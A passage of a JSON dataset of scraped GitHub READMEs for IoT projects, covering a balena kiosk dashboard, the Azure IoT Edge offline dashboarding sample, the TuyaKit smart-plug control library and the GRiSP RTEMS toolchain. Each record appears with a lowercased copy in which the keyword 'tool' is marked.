remote screen control/support/viewing\nfast load/runtime due to multi-threaded creation of browser windows\ngetting started\nthese instructions will get you a copy of the project up and running on your local machine for development and testing purposes. see deployment for notes on how to deploy the project on a live system.\nprerequisites\nthings you need to deploy this code to your device:\nsign up for a free account with balenacloud here\ncreate an application\nadd your device and download the os. make sure to specify the wifi information needed to connect your device\nflash your sd card (balenaetcher is recommended) and boot the device\nensure the device shows up in your application dashboard\ndownload the code for this project from github, and push to your application, using the balena-cli -----> tool !!! \ngit clone https://github.com/willswire/dashboards.git\nbalena push *application-name*\nconfiguration\nthe following enviroment variables must be set within application > device under d(x) - device variables:\nname value\nurl_one https://www.google.com [fully qualified url to load]\ntime_one 60 [integer which represents number of seconds to show url]\nurl_two\ntime_two\nurl_[...] infinte urls to load\ntime_[...] corresponding time values for each url\nzoom adjust zoom factor (must be in double format, i.e. 2.0). default is 1.0\nnovnc_password defaultpassword [obviously change this to something different]\ntz america/new_york [obviously change this to your timezone, see wikipedia for your tz\nin order to view the device remotely from within your browser, enable the public device url within the device summary page. then, you can simply click the link and login using the password set above.\nbuilt with\nelectronjs - the web framework used\nbalenacloud - iot device management\nnovnc - used to provide remote viewing/support through public device url (enable in device settings)", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000992, "year": null}, {"Unnamed: 0": 1004, "autor": 1004, "date": null, "content": "IoT Edge Offline Dashboarding\nThis project provides a set of modules that can be used with Azure IoT Edge to perform dashboarding at the edge.\nThe goal is to provide both guidance as well as a sample implementation to enable dashboards that run on the edge at sites in the field, while still sending data to the cloud for centralized reporting and monitoring.\nIf you want to jump right into the sample implementation, please start here.\nTable of contents\nEngage and contribute\nSolution goals\nSolution architecture & components\nOffline Dashboards sample\nEngage and contribute\nAsk questions about developing for Azure IoT Edge on Stack Overflow using the azure-iot-edge tag.\nSearch for known issues or file a new issue if you find something broken in this project.\nLearn how you can contribute to this project here.\nThis project has adopted the Microsoft Open Source Code of Conduct. For more information, see the Code of Conduct FAQ or contact opencode@microsoft.com with any additional questions or comments.\nSolution goals\nThe purpose of this solution is to provide both general purpose guidance for dashboarding on the edge as well as a sample implementation. While our sample implementation focuses on manufacturing, there are plenty of other potential use cases for this technology. Some examples include:\nRetail stores that may need local dashboards for inventory or asset management\nWarehouses that may need to manage the tracking and movement of product throughout the warehouse\nSmart buildings who may need to manage energy or HVAC efficiency throughout the property\n\"Things that move\" applications such as container or cruise ships that may need to operate for extended periods offline\nThe main thing in common in these scenarios is the potential need to not only send important 'site' data to the cloud for centralized reporting and analytics, but also the ability to continue local operations in the event of an internet outage.\nThe goal of this project is to demonstrate how this can be done for a specific manufacturing use case, but also give an example that can be re-used for other use cases by:\nReplacing the data source(s) to be specific to the new use cases\nReplacing the configuration files for the data ingestion and dashboards\nSolution architecture & components\nThe architecture for this solution utilizes four main components in addition to Azure IoT Hub.\nAzure IoT Edge is utilized to orchestrate and manage modules at the edge in addition to providing capabilities for offline operation and message routing.\nNode-RED is an open-source flow programming tool utilized to easily integrate and route messages from edge devices to InfluxDB.\nInfluxDB is an open-source, time series database for storing device telemetry.\nLastly, Grafana is an open-source analytics and dashboarding tool for visualizing device telemetry.\nThis architecture and its components are intended to be general purpose and apply across several industries and use cases by simply switching out the data sources and dashboards. However, by far the customer segment where this need comes up the most often is manufacturing. Therefore, the sample implementation below focuses on that use case.\nReasons for selecting this architecture\nThe main purpose of this solution is to provide an ability for local operators to view dashboards at the edge regardless of whether the edge device was online or offline. This is a natural scenario that IoT Edge supports. To support dashboarding however, there was a need to also select both a storage component as well as a visualization component.\nStorage component\nSeveral storage solutions were reviewed and the team selected InfluxDB for the following reasons:\nInflux DB is a time series DB and as such is a natural fit for telemetry data from devices\nOpen-source with a large community following\nSupports plugin to Grafana\nNode-RED libraries for easy integration\nQuick time to value and can be deployed as a Docker container\nRanked #1 for time series DBs according to DB-Engines\nAlthough InfluxDB was chosen to support storage, other DBs were considered and could potentially be used as well. For example, Graphite, Prometheus and Elasticsearch were also considered. Azure Time Series Insights was also considered but at the time of this activity was not yet available on Azure IoT Edge.\nVisualization component\nSeveral visualization solutions were reviewed and the team selected Grafana for the following reasons:\nOpen-source with a large community following\nThis particular use case covers metric analysis vs log analysis\nFlexibility with support for a wide array of plugins to different DBs and other supporting tools\nAllows you to share dashboards across an organization\nQuick time to value and can be deployed as a Docker container\nAlthough Grafana was chosen to support visualization and dashboarding, other tools were considered and could potentially be used as well. For example, Kibana may be a better fit for visualization and analyzing of log files and is a natural fit if working with Elasticsearch. Chronograf was considered but was limited to InfluxDB as a data source. PowerBI Report Server was also investigated, but lack of support for being able to containerize the PowerBI Report Server meant it could not be used directly with Azure IoT Edge. Additionally, PowerBI Report Server does not support the real-time \"live\" dashboarding required for this solution.\nIntegration component\nNode-RED was chosen as the tool to ease integration between IoT Edge and InfluxDB. Although the integration component could be written in several programming languages and containerized, Node-RED was selected for the following reasons:\nOpen-source with a large community following\nReadily available nodes for tapping into IoT Edge message routes\nReadily available nodes for integrating and inserting data into InfluxDB as well as many other DBs\nLarge library of nodes to integrate with other tools and platforms\nEasy flow-based programming allows manipulation and massaging of messages before inserted into a DB.\nCan be deployed as a Docker container\nOffline Dashboards sample\nThe \"Offline Dashboards\" sample is built upon Azure IoT Edge technology. Azure IoT Edge is responsible for deploying and managing lifecycle of a set of modules (described later) that make up Offline Dashboards sample.\nOffline Dashboards runs on the IoT Edge device, continuously recording data that is sent from devices to IoT Hub. It contains 3 modules:\nA Node-Red module that collects data from one or more data sources, in our case off of the edgeHub message bus, and writes that data into InfluxDB.\nAn InfluxDB module which stores data in time series structure.\nA Grafana module which serves data from InfluxDB in dashboards.\nThe sample implementation leverages data from two OPC-UA servers. For many reasons, OPC-UA is Microsoft's recommended manufacturing integration technology, where possible. However, the OPC-UA publisher that generates data for the dashboard could be substituted with other data sources including Modbus, MQTT, or other custom protocols.\nStart learning about the actual sample implementation here.", "link": "https://github.com/AzureIoTGBB/iot-edge-offline-dashboarding", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "iot edge offline dashboarding\nthis project provides a set of modules that can be used with azure iot edge to perform dashboarding at the edge.\nthe goal is to provide both guidance as well as a sample implementation to enable dashboards that run on the edge at sites in the field, while still sending data to the cloud for centralized reporting and monitoring.\nif you want to jump right into the sample implementation, please start here.\ntable of contents\nengage and contribute\nsolution goals\nsolution architecture & components\noffline dashboards sample\nengage and contribute\nask questions about developing for azure iot edge on stack overflow using the azure-iot-edge tag.\nsearch for known issues or file a new issue if you find something broken in this project.\nlearn how you can contribute to this project here.\nthis project has adopted the microsoft open source code of conduct. for more information, see the code of conduct faq or contact opencode@microsoft.com with any additional questions or comments.\nsolution goals\nthe purpose of this solution is to provide both general purpose guidance for dashboarding on the edge as well as a sample implementation. while our sample implementation focuses on manufacturing, there are plenty of other potential use cases for this technology. some examples include:\nretail stores that may need local dashboards for inventory or asset management\nwarehouses that may need to manage the tracking and movement of product throughout the warehouse\nsmart buildings who may need to manage energy or hvac efficiency throughout the property\n\"things that move\" applications such as container or cruise ships that may need to operate for extended periods offline\nthe main thing in common in these scenarios is the potential need to not only send important 'site' data to the cloud for centralized reporting and analytics, but also the ability to continue local operations in the event of an internet outage.\nthe goal of this project is to demonstrate how this can be done for a specific manufacturing use case, but also give an example that can be re-used for other use cases by:\nreplacing the data source(s) to be specific to the new use cases\nreplacing the configuration files for the data ingestion and dashboards\nsolution architecture & components\nthe architecture for this solution utilizes four main components in addition to azure iot hub.\nazure iot edge is utilized to orchestrate and manage modules at the edge in addition to providing capabilities for offline operation and message routing.\nnode-red is an open-source flow programming -----> tool !!!  utilized to easily integrate and route messages from edge devices to influxdb.\ninfluxdb is an open-source, time series database for storing device telemetry.\nlastly, grafana is an open-source analytics and dashboarding tool for visualizing device telemetry.\nthis architecture and its components are intended to be general purpose and apply across several industries and use cases by simply switching out the data sources and dashboards. however, by far the customer segment where this need comes up the most often is manufacturing. therefore, the sample implementation below focuses on that use case.\nreasons for selecting this architecture\nthe main purpose of this solution is to provide an ability for local operators to view dashboards at the edge regardless of whether the edge device was online or offline. this is a natural scenario that iot edge supports. to support dashboarding however, there was a need to also select both a storage component as well as a visualization component.\nstorage component\nseveral storage solutions were reviewed and the team selected influxdb for the following reasons:\ninflux db is a time series db and as such is a natural fit for telemetry data from devices\nopen-source with a large community following\nsupports plugin to grafana\nnode-red libraries for easy integration\nquick time to value and can be deployed as a docker container\nranked #1 for time series dbs according to db-engines\nalthough influxdb was chosen to support storage, other dbs were considered and could potentially be used as well. for example, graphite, prometheus and elasticsearch were also considered. azure time series insights was also considered but at the time of this activity was not yet available on azure iot edge.\nvisualization component\nseveral visualization solutions were reviewed and the team selected grafana for the following reasons:\nopen-source with a large community following\nthis particular use case covers metric analysis vs log analysis\nflexibility with support for a wide array of plugins to different dbs and other supporting tools\nallows you to share dashboards across an organization\nquick time to value and can be deployed as a docker container\nalthough grafana was chosen to support visualization and dashboarding, other tools were considered and could potentially be used as well. for example, kibana may be a better fit for visualization and analyzing of log files and is a natural fit if working with elasticsearch. chronograf was considered but was limited to influxdb as a data source. powerbi report server was also investigated, but lack of support for being able to containerize the powerbi report server meant it could not be used directly with azure iot edge. additionally, powerbi report server does not support the real-time \"live\" dashboarding required for this solution.\nintegration component\nnode-red was chosen as the tool to ease integration between iot edge and influxdb. although the integration component could be written in several programming languages and containerized, node-red was selected for the following reasons:\nopen-source with a large community following\nreadily available nodes for tapping into iot edge message routes\nreadily available nodes for integrating and inserting data into influxdb as well as many other dbs\nlarge library of nodes to integrate with other tools and platforms\neasy flow-based programming allows manipulation and massaging of messages before inserted into a db.\ncan be deployed as a docker container\noffline dashboards sample\nthe \"offline dashboards\" sample is built upon azure iot edge technology. azure iot edge is responsible for deploying and managing lifecycle of a set of modules (described later) that make up offline dashboards sample.\noffline dashboards runs on the iot edge device, continuously recording data that is sent from devices to iot hub. it contains 3 modules:\na node-red module that collects data from one or more data sources, in our case off of the edgehub message bus, and writes that data into influxdb.\nan influxdb module which stores data in time series structure.\na grafana module which serves data from influxdb in dashboards.\nthe sample implementation leverages data from two opc-ua servers. for many reasons, opc-ua is microsoft's recommended manufacturing integration technology, where possible. however, the opc-ua publisher that generates data for the dashboard could be substituted with other data sources including modbus, mqtt, or other custom protocols.\nstart learning about the actual sample implementation here.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7001004, "year": null}, {"Unnamed: 0": 1008, "autor": 1008, "date": null, "content": "Tuya Kit\nA library to control Tuya smart home devices via local TCP connection.\n// Once you setup a device...\nsocket = new Woox_R4026()\n{\nIP = \"192.168.0.100\",\nport = 6668,\nprotocolVersion = \"3.1\",\nname = \"Lounge Light Socket\",\ndevId = \"<DEV_ID>\",\nlocalKey = \"<LOCAL_KEY>\"\n};\n// ...you can simply set states via device wrapper.\nsocket.TurnOn();\nCredits\nBased on Max Isom's reverse engineered TuyAPI library (and corresponding TuyaCore .NET port by Marcus Lum).\nTuya services\nTuya distributed devices are mostly controlled with an ESP8266 WiFi module with a specific firmware (see Module Overview). By default you can control the devices via a Tuya specific app, like Tuya Smart, Smart Life, Jinvoo Smart, Lohas Smart or Woox Home to name a few. Under the hood they are all various derivatives of the white labeled Tuya Smart Cloud Service (brands have separate containers for device data though).\nOnce you have registered your device with one of the apps, it will have a localKey assigned upon pairing. From then on the app encrypts device requests with that key.\nThis library just does the same. Once you have the corresponding device data it orchestrates the encryption and the communication protocol via local TCP connection.\nGetting device data\nAfter you registered you device in one of the consumer apps mentioned above, you can find device information details in there somewhere. It tells you the devId (Smart Life app calls it Virtual ID) and the Mac Address. Having the Mac Address you can look up the Local IP Address of the device in the DHCP Client List of your WiFi Router. Port number and Protocol Version is set to 6668 and 3.1 by default.\nGetting the localKey can be tricky. Luckily Max Isom created a tool tuya-cli to extract device data from the network traffic. See Linking a Tuya Device for a detailed breakdown.\nDevice control schema\nTo obtain the dps schema (the device properties you can manage) I simply inspected the console output of the Android Smart Life app using adb logcat. It gives you a pretty detailed log when navigating to the Device Information view. For a Woox R4026 Smart Plug it shows this schema:\n{\n\"initialProps\": {\n\"devInfo\": {\n...\n\"dps\": {\n\"1\": true,\n\"9\": 0\n},\n...\n\"schema\": {\n\"1\": {\n\"type\": \"obj\",\n\"name\": \"\u5f00\u51731\",\n\"mode\": \"rw\",\n\"code\": \"switch_1\",\n\"id\": \"1\",\n\"schemaType\": \"bool\",\n\"iconname\": \"icon-dp_power2\",\n\"property\": \"{\\\"type\\\":\\\"bool\\\"}\"\n},\n\"9\": {\n\"type\": \"obj\",\n\"name\": \"\u5f00\u51731\u5012\u8ba1\u65f6\",\n\"mode\": \"rw\",\n\"code\": \"countdown_1\",\n\"id\": \"9\",\n\"schemaType\": \"value\",\n\"iconname\": \"icon-dp_time2\",\n\"property\": \"{\\\"max\\\":86400,\\\"min\\\":0,\\\"scale\\\":0,\\\"step\\\":1,\\\"type\\\":\\\"value\\\",\\\"unit\\\":\\\"s\\\"}\"\n}\n}\n...\n}\n}\n}\nIt shows a bool switch on [\"dps\"][\"1\"] and a countdown value (seconds) on [\"dps\"][\"9\"].\nImplementing a device\nAfter you created a Device instance, you can send any JSON data to it using a Request object.\n// Get device properties.\nJObject response = await new Request().SendJSONObjectForCommandToDevice(\nnew Dictionary<string, object>\n{\n[\"gwId\"] = socket.gwId,\n[\"devId\"] = socket.devId\n},\nRequest.Command.GetStatus,\nsocket);\nA Woox R4026 Smart Plug responds with a status like below:\n{\n\"devId\":\"58205000840d8e46ebb0\",\n\"dps\":\n{\n\"1\" : true,\n\"9\" : 0\n}\n}\nIt gives you a status report according the very same control schema obtained above. To cut boilerplate, it is wrapped into a simple Get() method in Device class that gives you back only the dps data you care about.\n// Get device properties.\nDictionary<string, object> dps = await socket.Get();\n{\n\"1\" : true,\n\"9\" : 0\n}\nTo set dps you can use Device.Set().\n// Set device properties.\nawait socket.Set(\nnew Dictionary<string, object>\n{\n[\"1\"] = false,\n[\"2\"] = 0\n}\n);\nOnce you have a specific device, you can wrap up dps all communication into a Device subclass (see Woox_R4026.cs for more).\n...\npublic async void TurnOff()\n{\nawait Set(\nnew Dictionary<string, object>\n{\n[\"1\"] = false,\n[\"2\"] = 0\n}\n);\n}\npublic async void TurnOn()\n{\nawait Set(\nnew Dictionary<string, object>\n{\n[\"1\"] = true,\n[\"2\"] = 0\n}\n);\n}\n...\nAfter that you can use pretty much without any boilerplate.\nsocket.TurnOn();\nNext up\nWill probably implement retry attempts, also I'm planning to create the library for iOS.\nFurthermore, would be great if you guys could contribute with various Device implementations. I saw that there is a myriad of manufacturers out there, let me just highligt some of the brands I encountered.\nCotify, Ushawn, Elegant Choise, Cxy, Zenic, Sonew, Venoro, Innens, Oittm, Lixada, Woox\nLicense\nLicensed under the MIT license.", "link": "https://github.com/Geri-Borbas/.NET.Library.TuyaKit", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "tuya kit\na library to control tuya smart home devices via local tcp connection.\n// once you setup a device...\nsocket = new woox_r4026()\n{\nip = \"192.168.0.100\",\nport = 6668,\nprotocolversion = \"3.1\",\nname = \"lounge light socket\",\ndevid = \"<dev_id>\",\nlocalkey = \"<local_key>\"\n};\n// ...you can simply set states via device wrapper.\nsocket.turnon();\ncredits\nbased on max isom's reverse engineered tuyapi library (and corresponding tuyacore .net port by marcus lum).\ntuya services\ntuya distributed devices are mostly controlled with an esp8266 wifi module with a specific firmware (see module overview). by default you can control the devices via a tuya specific app, like tuya smart, smart life, jinvoo smart, lohas smart or woox home to name a few. under the hood they are all various derivatives of the white labeled tuya smart cloud service (brands have separate containers for device data though).\nonce you have registered your device with one of the apps, it will have a localkey assigned upon pairing. from then on the app encrypts device requests with that key.\nthis library just does the same. once you have the corresponding device data it orchestrates the encryption and the communication protocol via local tcp connection.\ngetting device data\nafter you registered you device in one of the consumer apps mentioned above, you can find device information details in there somewhere. it tells you the devid (smart life app calls it virtual id) and the mac address. having the mac address you can look up the local ip address of the device in the dhcp client list of your wifi router. port number and protocol version is set to 6668 and 3.1 by default.\ngetting the localkey can be tricky. luckily max isom created a -----> tool !!!  tuya-cli to extract device data from the network traffic. see linking a tuya device for a detailed breakdown.\ndevice control schema\nto obtain the dps schema (the device properties you can manage) i simply inspected the console output of the android smart life app using adb logcat. it gives you a pretty detailed log when navigating to the device information view. for a woox r4026 smart plug it shows this schema:\n{\n\"initialprops\": {\n\"devinfo\": {\n...\n\"dps\": {\n\"1\": true,\n\"9\": 0\n},\n...\n\"schema\": {\n\"1\": {\n\"type\": \"obj\",\n\"name\": \"\u5f00\u51731\",\n\"mode\": \"rw\",\n\"code\": \"switch_1\",\n\"id\": \"1\",\n\"schematype\": \"bool\",\n\"iconname\": \"icon-dp_power2\",\n\"property\": \"{\\\"type\\\":\\\"bool\\\"}\"\n},\n\"9\": {\n\"type\": \"obj\",\n\"name\": \"\u5f00\u51731\u5012\u8ba1\u65f6\",\n\"mode\": \"rw\",\n\"code\": \"countdown_1\",\n\"id\": \"9\",\n\"schematype\": \"value\",\n\"iconname\": \"icon-dp_time2\",\n\"property\": \"{\\\"max\\\":86400,\\\"min\\\":0,\\\"scale\\\":0,\\\"step\\\":1,\\\"type\\\":\\\"value\\\",\\\"unit\\\":\\\"s\\\"}\"\n}\n}\n...\n}\n}\n}\nit shows a bool switch on [\"dps\"][\"1\"] and a countdown value (seconds) on [\"dps\"][\"9\"].\nimplementing a device\nafter you created a device instance, you can send any json data to it using a request object.\n// get device properties.\njobject response = await new request().sendjsonobjectforcommandtodevice(\nnew dictionary<string, object>\n{\n[\"gwid\"] = socket.gwid,\n[\"devid\"] = socket.devid\n},\nrequest.command.getstatus,\nsocket);\na woox r4026 smart plug responds with a status like below:\n{\n\"devid\":\"58205000840d8e46ebb0\",\n\"dps\":\n{\n\"1\" : true,\n\"9\" : 0\n}\n}\nit gives you a status report according the very same control schema obtained above. to cut boilerplate, it is wrapped into a simple get() method in device class that gives you back only the dps data you care about.\n// get device properties.\ndictionary<string, object> dps = await socket.get();\n{\n\"1\" : true,\n\"9\" : 0\n}\nto set dps you can use device.set().\n// set device properties.\nawait socket.set(\nnew dictionary<string, object>\n{\n[\"1\"] = false,\n[\"2\"] = 0\n}\n);\nonce you have a specific device, you can wrap up dps all communication into a device subclass (see woox_r4026.cs for more).\n...\npublic async void turnoff()\n{\nawait set(\nnew dictionary<string, object>\n{\n[\"1\"] = false,\n[\"2\"] = 0\n}\n);\n}\npublic async void turnon()\n{\nawait set(\nnew dictionary<string, object>\n{\n[\"1\"] = true,\n[\"2\"] = 0\n}\n);\n}\n...\nafter that you can use pretty much without any boilerplate.\nsocket.turnon();\nnext up\nwill probably implement retry attempts, also i'm planning to create the library for ios.\nfurthermore, would be great if you guys could contribute with various device implementations. i saw that there is a myriad of manufacturers out there, let me just highligt some of the brands i encountered.\ncotify, ushawn, elegant choise, cxy, zenic, sonew, venoro, innens, oittm, lixada, woox\nlicense\nlicensed under the mit license.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7001008, "year": null}, {"Unnamed: 0": 1018, "autor": 1018, "date": null, "content": "GRISP\nPrerequisites\nthe xz decompression tool needs to be installed\nthe zlib development files are necessary\nbison, flex and texinfo\nto check for some of RTEMS source builders prerequisites\ngit submodule init\ngit submodule update rtems-source-builder\ncd rtems-source-builder\n./source-builder/sb-check\nQuick Start Guide\nYou can build the whole toolchain by running ./build/build.sh. See [Building] for more details.\nTo build the simple RTEMS sample application, go to grisp-simple-sample and call make.\nIf you want to use OpenOCD, you have to make sure that you have read and write access to the USB device. On a Linux system using udev, you can copy the udev-rule from build/99-grisp.rule to /etc/udev/rules.d/ for that. The rule also provides a fixed name for the serial console (/dev/ttyGRiSP).\nDirectory Structure\nThe following directory structure is used in this project:\nbuild: scripts for building the tool chain and libraries\ngrisp-XYZ: applications\nlibXYZ: non-RTEMS libraries\nrtems-XYZ: software and libraries related to RTEMS\nREADME.asciidoc: this document\nBuilding\nThe complete toolchain is built by running ./build/build.sh. This will do the following:\ncheck out the necessary git submodules\nbootstrap RTEMS\nbuild and install the toolchain\nbuild and install the RTEMS BSP\nbuild and install necessary libs\nAll installations are made inside the rtems-install subdirectory in the base directory of the repository. To change the install location edit the PREFIX in build/configuration.sh.\ngit Repository Structure\nThe grisp-software project pulls in a number of git submodules (like RTEMS). Most of these submodules have been forked with no or only minimal changes. The branches in the submodules follow the following guidelines:\nmaster tracks the upstream development of the project.\nIf patches are necessary, they will be added on branches and the commits on the branch are referenced in grisp-software.\nHere is an example for how a git tree of a submodule could look like:\no---o---o---B'--o---o---o---o---o---o master (clone of upstream/master)\n\\ \\\n\\ A'--C' grisp-20171110-xyz\n\\\nA---B---C grisp-20171020-xyz\nIn that example grisp-20171020-xyz is a version of the software with some adaptions for GRiSP. If for example a (maybe slightly modified) version of the patch B has been accepted in the upstream repository and GRiSP now wants to update to a newer version of the master, B is no longer necessary. Therefore the new grisp-20171110-xyx no longer contains B but (adapted) versions of A and C are still necessary.\nThe old grisp-20171020-xyz is still be kept so that a old version of the grisp-software repository can still access the commits.\nThat structure makes it relatively easy to see the exact differences to the upstream version and which patches might should be integrated into it in the future. The disadvantage is that it will leave quite a number of old branches that are still necessary so that older grisp-software revisions can reference them.\nRe-Building only target specific RTEMS libs\nSince building the toolchain takes a lot of time and since the toolchain changes less often than the rest of the system you can also just rebuild RTEMS and its libs.\nTo do that delete the rtems-install/rtems-4.12/arm-rtems4.12/atsamv directory and then do a\n./build/build.sh --no-toolchain --no-bootstrap\nUpdating the submodules from github\nWhen you want to rebuild with some new version from the Git repos you need to make sure that you update the sumodules:\ngit pull\ngit submodule update\nCleaning\nNormally, running ./build/build.sh (or any other of the individual build scripts in the ./build folder) should rebuild without the need for cleaning.\nHowever, if you want a clean start you can delete the rtems-install folder which will delete all created binaries, libraries and header files.\nTo make a complete reset of the whole repository, use the following commands:\ngit co . # Reverts all uncommited changes\ngit clean -dxn # gives a preview, what unversioned files would be deleted\ngit clean -dxf # deletes everything that is not under version control\nBoot Loader\nThe boot loader will try to initialize and mount the SD card. In case this is successful it tries to read the grisp.ini configuration file from the SD root directory.\nSample grisp.ini (showing the default values):\n[boot]\ntimeout_in_seconds = 3\nimage_path = /media/mmcsd-0-0/grisp.bin\nAll values are optional and in case something is missing default values will be used (presented in the listing above). Once the timeout expired without user input the automatic application load sequence starts.\nUpdating the Boot Loader\nFor updating the bootloader build OpenOCD by running ./build/build-openocd.sh. You can then update the boot loader with the following call:\n./build/debug-load-flash.sh grisp-bootloader/binaries/bootloader.exe\nThe process will need quite some time (about 30 seconds for loading and about a minute for verify).\nIf OpenOCD is failing due to libusb related issues, you might need to make adjustments specific to your operating system. Please see the libusb FAQ: https://github.com/libusb/libusb/wiki/FAQ\nDebugging\nIt is possible to debug an application using the on-board FTDI to SWD adapter. First build and install OpenOCD by running ./build/build-openocd.sh.\nPlace a SD with some sample application into the target. This takes care that the bootloader starts an application. The debug scripts will wait for this and then overwrite the application that is booted by the bootloader with the one that should be debugged.\nAfter that you should start openocd on one console using ./build/debug-start-openocd.sh. This starts an GDB-Server. Do not terminate the process. You can then start a gdb that connects to the server using ./build/debug-start-gdb.sh path/to/app.exe. The script adds a reset command to the normal gdb that restarts the target and reloads the application. Note that for bigger applications, that might need quite some time.\nWiFi\nBy default, the wpa_supplicant.conf from the root of the SD card will be used. For a default WPA2 encrypted network, the file should look like follows:\nnetwork={\nssid=\"mynetwork\"\nkey_mgmt=WPA-PSK\npsk=\"secret\"\n}", "link": "https://github.com/grisp/grisp-software", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "grisp\nprerequisites\nthe xz decompression -----> tool !!!  needs to be installed\nthe zlib development files are necessary\nbison, flex and texinfo\nto check for some of rtems source builders prerequisites\ngit submodule init\ngit submodule update rtems-source-builder\ncd rtems-source-builder\n./source-builder/sb-check\nquick start guide\nyou can build the whole toolchain by running ./build/build.sh. see [building] for more details.\nto build the simple rtems sample application, go to grisp-simple-sample and call make.\nif you want to use openocd, you have to make sure that you have read and write access to the usb device. on a linux system using udev, you can copy the udev-rule from build/99-grisp.rule to /etc/udev/rules.d/ for that. the rule also provides a fixed name for the serial console (/dev/ttygrisp).\ndirectory structure\nthe following directory structure is used in this project:\nbuild: scripts for building the tool chain and libraries\ngrisp-xyz: applications\nlibxyz: non-rtems libraries\nrtems-xyz: software and libraries related to rtems\nreadme.asciidoc: this document\nbuilding\nthe complete toolchain is built by running ./build/build.sh. this will do the following:\ncheck out the necessary git submodules\nbootstrap rtems\nbuild and install the toolchain\nbuild and install the rtems bsp\nbuild and install necessary libs\nall installations are made inside the rtems-install subdirectory in the base directory of the repository. to change the install location edit the prefix in build/configuration.sh.\ngit repository structure\nthe grisp-software project pulls in a number of git submodules (like rtems). most of these submodules have been forked with no or only minimal changes. the branches in the submodules follow the following guidelines:\nmaster tracks the upstream development of the project.\nif patches are necessary, they will be added on branches and the commits on the branch are referenced in grisp-software.\nhere is an example for how a git tree of a submodule could look like:\no---o---o---b'--o---o---o---o---o---o master (clone of upstream/master)\n\\ \\\n\\ a'--c' grisp-20171110-xyz\n\\\na---b---c grisp-20171020-xyz\nin that example grisp-20171020-xyz is a version of the software with some adaptions for grisp. if for example a (maybe slightly modified) version of the patch b has been accepted in the upstream repository and grisp now wants to update to a newer version of the master, b is no longer necessary. therefore the new grisp-20171110-xyx no longer contains b but (adapted) versions of a and c are still necessary.\nthe old grisp-20171020-xyz is still be kept so that a old version of the grisp-software repository can still access the commits.\nthat structure makes it relatively easy to see the exact differences to the upstream version and which patches might should be integrated into it in the future. the disadvantage is that it will leave quite a number of old branches that are still necessary so that older grisp-software revisions can reference them.\nre-building only target specific rtems libs\nsince building the toolchain takes a lot of time and since the toolchain changes less often than the rest of the system you can also just rebuild rtems and its libs.\nto do that delete the rtems-install/rtems-4.12/arm-rtems4.12/atsamv directory and then do a\n./build/build.sh --no-toolchain --no-bootstrap\nupdating the submodules from github\nwhen you want to rebuild with some new version from the git repos you need to make sure that you update the sumodules:\ngit pull\ngit submodule update\ncleaning\nnormally, running ./build/build.sh (or any other of the individual build scripts in the ./build folder) should rebuild without the need for cleaning.\nhowever, if you want a clean start you can delete the rtems-install folder which will delete all created binaries, libraries and header files.\nto make a complete reset of the whole repository, use the following commands:\ngit co . # reverts all uncommited changes\ngit clean -dxn # gives a preview, what unversioned files would be deleted\ngit clean -dxf # deletes everything that is not under version control\nboot loader\nthe boot loader will try to initialize and mount the sd card. in case this is successful it tries to read the grisp.ini configuration file from the sd root directory.\nsample grisp.ini (showing the default values):\n[boot]\ntimeout_in_seconds = 3\nimage_path = /media/mmcsd-0-0/grisp.bin\nall values are optional and in case something is missing default values will be used (presented in the listing above). once the timeout expired without user input the automatic application load sequence starts.\nupdating the boot loader\nfor updating the bootloader build openocd by running ./build/build-openocd.sh. you can then update the boot loader with the following call:\n./build/debug-load-flash.sh grisp-bootloader/binaries/bootloader.exe\nthe process will need quite some time (about 30 seconds for loading and about a minute for verify).\nif openocd is failing due to libusb related issues, you might need to make adjustments specific to your operating system. please see the libusb faq: https://github.com/libusb/libusb/wiki/faq\ndebugging\nit is possible to debug an application using the on-board ftdi to swd adapter. first build and install openocd by running ./build/build-openocd.sh.\nplace a sd with some sample application into the target. this takes care that the bootloader starts an application. the debug scripts will wait for this and then overwrite the application that is booted by the bootloader with the one that should be debugged.\nafter that you should start openocd on one console using ./build/debug-start-openocd.sh. this starts an gdb-server. do not terminate the process. you can then start a gdb that connects to the server using ./build/debug-start-gdb.sh path/to/app.exe. the script adds a reset command to the normal gdb that restarts the target and reloads the application. note that for bigger applications, that might need quite some time.\nwifi\nby default, the wpa_supplicant.conf from the root of the sd card will be used. for a default wpa2 encrypted network, the file should look like follows:\nnetwork={\nssid=\"mynetwork\"\nkey_mgmt=wpa-psk\npsk=\"secret\"\n}", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7001018, "year": null}], "name": "toolIot"}